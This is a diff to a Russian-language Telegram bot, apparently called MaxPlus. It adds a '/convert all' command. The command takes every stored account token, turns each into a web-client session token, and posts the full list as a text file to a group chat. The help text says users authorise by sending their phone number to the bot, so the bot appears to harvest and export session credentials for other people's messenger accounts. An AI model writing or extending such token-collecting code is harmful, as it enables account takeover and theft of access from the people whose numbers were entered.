@@ -181,7 +181,7 @@ async def help_cmd(msg: Message):
     text = (
         "📋 <b>Команды MaxPlus:</b>\n\n"
         "/get — Получить все токены и статистику\n"
-        "/convert — Конвертировать токен в WEB\n"
+        "/convert — Конвертировать токены в WEB\n"
         "/help — Показать эту справку\n\n"
         "<b>Как авторизоваться:</b>\n"
         "1. Отправь номер в личку боту\n"
@@ -341,20 +341,60 @@ async def code_timeout(user_id: int, phone: str):
         except Exception:
             pass
 
-# === Конвертация токена в WEB ===
+# === Конвертация токенов в WEB ===
 @dp.message(Command("convert"))
 async def convert_token(msg: Message):
     if not await is_approved_group(msg):
         return
 
-    try:
-        phone = msg.text.split()[1]
-    except IndexError:
-        return await msg.answer("❌ Используй: /convert +79161234567")
+    args = msg.text.split()
+    convert_all = len(args) > 1 and args[1].lower() == "all"
+
+    if not convert_all:
+        try:
+            phone = args[1]
+        except IndexError:
+            return await msg.answer("❌ Используй: /convert +79161234567 или /convert all")
 
     tokens = await get_all_tokens()
-    token_data = next((t for t in tokens if t["phone"] == phone), None)
 
+    if convert_all:
+        if not tokens:
+            return await msg.answer("📭 Токенов для конвертации нет")
+
+        status_msg = await msg.answer(f"⏳ Конвертирую все токены ({len(tokens)} шт.)...")
+        converted = 0
+        web_tokens_list = []
+
+        for t in tokens:
+            phone = t["phone"]
+            token = t["token"]
+            try:
+                web_client = WebClient(
+                    work_dir="cache",
+                    session_name=f"web_{phone}.db",
+                    extra_config=ExtraConfig(token=token),
+                )
+                await web_client.start()
+                web_token = read_token_from_session(f"web_{phone}")
+                if web_token:
+                    await save_token_to_db(phone, web_token)
+                    web_tokens_list.append(f"{phone} — {web_token}")
+                    converted += 1
+                    logger.info(f"Converted {phone} -> WEB")
+            except Exception as e:
+                logger.warning(f"Failed to convert {phone}: {e}")
+
+        from io import BytesIO
+        file = BytesIO("\n".join(web_tokens_list).encode())
+        file.name = "web_tokens.txt"
+
+        await status_msg.edit_text(f"✅ Конвертировано: {converted}/{len(tokens)}")
+        await msg.answer_document(file, caption=f"📊 WEB-токены ({converted} шт.)")
+        return
+
+    # Конвертация одного номера
+    token_data = next((t for t in tokens if t["phone"] == phone), None)
     if not token_data:
         return await msg.answer("❌ Токен для этого номера не найден")
 
